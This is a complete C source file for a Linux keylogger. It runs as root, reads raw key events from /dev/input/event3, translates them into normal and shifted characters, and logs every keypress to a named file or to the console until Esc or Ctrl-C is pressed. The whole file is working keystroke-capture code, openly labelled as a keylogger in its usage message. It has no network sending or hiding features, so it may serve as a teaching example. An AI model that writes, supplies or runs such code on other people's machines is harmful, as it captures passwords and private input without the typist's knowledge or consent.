#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <linux/input.h>
#include <signal.h>


#define UK "UNKNOWN"

#define KEYBOARD "/dev/input/event3"

static int running = 1;

static void sig_handler(int signo)
{
    running = 0;
}


/*
 * normal keyboard keystrokes 
 */
static const char * keycodes[] =
{
    "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
    "-", "=", "BACKSPACE", "TAB", "q", "w", "e", "r", "t", "y", "u", "i",
    "o", "p", "[", "]", "ENTER", "L_CTRL", "a", "s", "d", "f", "g", "h",
    "j", "k", "l", ";", "'", "`", "L_SHIFT", "\\", "z", "x", "c", "v", "b",
    "n", "m", ",", ".", "/", "R_SHIFT", "*", "L_ALT", "SPACE", "CAPS_LOCK", 
    "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM_LOCK",
    "SCROLL_LOCK", "NL_7", "NL_8", "NL_9", "-", "NL_4", "NL5",
    "NL_6", "+", "NL_1", "NL_2", "NL_3", "INS", "DEL", UK, UK, UK,
    "F11", "F12", UK, UK,	UK, UK,	UK, UK, UK, "R_ENTER", "R_CTRL", "/", 
    "PRT_SCR", "R_ALT", UK, "HOME", "UP", "PAGE_UP", "LEFT", "RIGHT", "END", 
    "DOWN",	"PAGE_DOWN", "INSERT", "DELETE", UK, UK, UK, UK,UK, UK, UK, 
    "PAUSE"
};


/*
 * keyboard keystrokes when the right or left Shift key is pressed
 */
static const char * shifted_keycodes[] =
{
    "RESERVED", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", 
    "_", "+", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I", 
    "O", "P", "{", "}", "ENTER", "L_CTRL", "A", "S", "D", "F", "G", "H", 
    "J", "K", "L", ":", "\"", "~", "L_SHIFT", "|", "Z", "X", "C", "V", "B", 
    "N", "M", "<", ">", "?", "R_SHIFT", "*", "L_ALT", "SPACE", "CAPS_LOCK", 
    "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM_LOCK", 
    "SCROLL_LOCK", "HOME", "UP", "PGUP", "-", "LEFT", "NL_5", 
    "R_ARROW", "+", "END", "DOWN", "PGDN", "INS", "DEL", UK, UK, UK, 
    "F11", "F12", UK, UK,	UK, UK,	UK, UK, UK, "R_ENTER", "R_CTRL", "/", 
    "PRT_SCR", "R_ALT", UK, "HOME", "UP", "PAGE_UP", "LEFT", "RIGHT", "END", 
    "DOWN",	"PAGE_DOWN", "INSERT", "DELETE", UK, UK, UK, UK,UK, UK, UK, 
    "PAUSE"
};


/*
 * returns true when the keycode is a Shift (left or right)
 */
int isShift(int code)
{
    return ((code == KEY_LEFTSHIFT) || (code == KEY_RIGHTSHIFT));
}


/*
 * returns true when the keycode is Esc
 */
int isEsc(int code)
{
    return (code == KEY_ESC);
}


/*
 * checks if the user has root privileges
 */
int isRoot(void) {
    if (geteuid() != 0) {
        fprintf(stderr, "\nMust run it as root, in order to have access "
                "to the keyboard device\n");
        return 0;
    }
    return 1;	
}


/*
 * prints the usage message
 */
void usage(void)
{
    printf(
            "\n"
            "Usage:\n"
            "     sudo ./keyloger -f file [-h]\n"
            "\n"
            "Options:\n"
            "  -f    file    Path to the output file.\n"
            "  -h            This help message.\n"
          );
    exit(EXIT_FAILURE);
}


void keylogger(int keyboard, char *output)
{
    int shift_flag = 0;
    FILE *file = NULL;
    struct input_event event;

    if (output) {
        file = fopen(output, "w");
        if (!file) {
            fprintf(stderr, "Error opening file\n");
            return;
        }
    }

    while (running) {
        read(keyboard, &event, sizeof(event));

        /* If a key from the keyboard is pressed */
        if (event.type == EV_KEY && event.value == 1) {
            /* If it's Esc, exit */
            if (isEsc(event.code)) return;
            /* If it's shift (left or right), set the flag */
            if (isShift(event.code)) shift_flag = event.code;
            /* If it's shift and another key, print the shifted value */
            if (shift_flag && !isShift(event.code)) {
                /* Output to file */
                if (output != NULL) {
                    fprintf(file, "%s + %s\n",
                            keycodes[shift_flag], shifted_keycodes[event.code]);
                    fflush(file);
                } else {
                    /* Output to console */
                    printf("%s + %s\n",
                            keycodes[shift_flag], shifted_keycodes[event.code]);
                }
            }
            /* If it's not shift, just print the key */
            else if (!shift_flag && !isShift(event.code)) {
                /* Again, output to file */
                if (output != NULL) {
                    fprintf(file, "%s\n", keycodes[event.code]);
                    fflush(file);
                }
                else {
                    /* Output to console */
                    printf("%s\n", keycodes[event.code]);
                }
            }
        } else {
            /* If a key from the keyboard is released */
            if (event.type == EV_KEY && event.value == 0) {
                if (isShift(event.code)) shift_flag = 0;
            }
        }
    }

    if (file)
        fclose(file);

    return;
}


int main(int argc, char *argv[])
{
    int opt;
    int kb;
    char *output = NULL;

    signal(SIGINT, sig_handler);

    if (!isRoot())
        usage();

    while ((opt = getopt(argc, argv, "f:h")) != -1) {
        switch (opt) {
            case 'f':
                output = strdup(optarg);
                break;
            case 'h':
            default:
                usage();
        }
    }

    if ((kb = open(KEYBOARD, O_RDONLY)) < 0) {
        fprintf(stderr, "\nUnable to read from the device\n");
        exit(EXIT_FAILURE);
    }

    keylogger(kb, output);

    printf("\nKeylogger terminated.\n");

    close(kb);

    return 0;
}
